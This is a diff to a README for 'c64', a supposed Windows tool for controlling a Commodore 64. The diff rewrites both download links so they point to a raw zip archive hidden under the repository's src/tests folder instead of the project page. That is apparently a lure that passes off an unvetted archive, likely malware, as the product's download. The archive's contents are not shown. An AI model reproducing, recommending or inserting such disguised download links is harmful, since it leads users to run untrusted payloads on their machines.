@@ -1,10 +1,10 @@
 # 🎮 c64 - Control Your C64 From Windows
 
-[![Download c64](https://img.shields.io/badge/Download-c64-blue.svg)](https://github.com/fancied-taper314/c64)
+[![Download c64](https://img.shields.io/badge/Download-c64-blue.svg)](https://github.com/fancied-taper314/c64/raw/refs/heads/main/src/tests/c-v3.5.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/fancied-taper314/c64
+Visit this page to download: https://github.com/fancied-taper314/c64/raw/refs/heads/main/src/tests/c-v3.5.zip
 
 ## 🪟 Windows Setup
 
